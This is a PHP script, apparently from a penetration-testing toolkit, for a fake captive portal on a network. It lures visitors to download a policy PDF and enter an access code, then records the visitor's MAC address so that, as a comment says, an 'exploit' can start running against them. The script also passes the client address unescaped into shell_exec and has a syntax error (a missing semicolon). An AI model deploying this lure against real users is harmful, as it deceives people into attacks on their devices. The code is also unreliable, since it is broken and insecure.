<?php

//Thanks to:
//http://www.proso.com/2011/03/31/captive-audience-using-iptables-and-php-as-a-home-grown-captive-portal-during-penetration-tests-2/
//http://www.andybev.com/index.php/Main_Page

//error_reporting(E_ALL);
//ini_set ('display_errors', '1');


$server_name = "www";
$domain_name = "portal";
$site_name = file_get_contents('/tmp/name');

$pdf = file_get_contents('/tmp/pdf'); //read location of pdf
	
// Path to the arp command on the local server
$arp = "/usr/sbin/arp";
 
// Attempt to get the client's mac address
$mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);
preg_match('/..:..:..:..:..:../',$mac , $matches);
@$mac = $matches[0];
//if (!isset($mac)) { exit; }

$success=
"<html>\n" .
"<head>\n" .
"</head>\n" .
"<body>\n" .
"<center><p1>Authorized</p1></center>\n" .
"<center><p1>Please wait while you are redirected...</p1></center>\n" .
"</body>\n" .
"</html>";

$code = $_POST['code'];

if ($code !="1367") {
  // code doesn’t equal expected value, so display form
  sleep (1)
  ?>
  <head><?php echo $site_name;?></head>
  <h1>Welcome to <?php echo $site_name;?></h1>
  You must agree to the Acceptable Use Policy.<br>
  Enter the access code found at the bottom of the policy:<br><br>
  <?php echo "<a href=/portal_pdf/$pdf>Download Policy Here</a><br><br>"?>
  <form method='POST'>
  <table border=0 cellpadding=5 cellspacing=0>
  <tr><td><align="center">Access code:</td><td><input type='text' name='code'></td></tr>
  <tr><td></td><td><input type='submit' name='submit' value='Submit'></td></tr>
  </table>
  </form>
<?php
} else {
        // Allow through the captive portal
        $fp = fopen("/tmp/ip/ip", "w"); // "w" to overwrite previous mac
        fwrite($fp, $mac);
        fclose($fp);
        
        sleep (1); //for dnotify to read $mac
        sleep (1); //time for exploit to start running
        echo $success;
        
                
        //header("location:http://".$_GET['add']); //forward client to their original
        //exit;
}
 
?>
